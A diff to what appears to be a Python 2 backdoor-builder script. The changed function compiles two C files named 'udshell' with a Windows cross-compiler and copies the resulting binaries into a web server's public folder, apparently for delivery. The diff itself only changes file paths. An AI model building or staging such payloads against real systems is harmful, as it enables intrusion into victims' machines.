@@ -237,10 +237,10 @@ def final(Part1, Part2, Part3, patt1, patt2, patt3):
 
 	print "{} Compiling..".format(left_sign)
 
-	system('i686-w64-mingw32-gcc -o /root/udback_build/%s /root/udback_build/udshellfire.c' % ("f"+bdName ))
-	system('i686-w64-mingw32-gcc -o /root/udback_build/%s /root/udback_build/udshell.c' % (bdName))
-	system('cp /root/udback_build/%s /var/www/html/' %(bdName))
-	system('cp /root/udback_build/%s /var/www/html/' %("f"+bdName))
+	system('i686-w64-mingw32-gcc -o ./udback_build/%s ./udback_build/udshellfire.c' % ("f"+bdName ))
+	system('i686-w64-mingw32-gcc -o ./udback_build/%s ./udback_build/udshell.c' % (bdName))
+	system('cp ./udback_build/%s /var/www/html/' %(bdName))
+	system('cp ./udback_build/%s /var/www/html/' %("f"+bdName))
 
 	print("{} {}Done {}{}{}{}".format(left_sign, g, reset, w, cmark, reset))
 
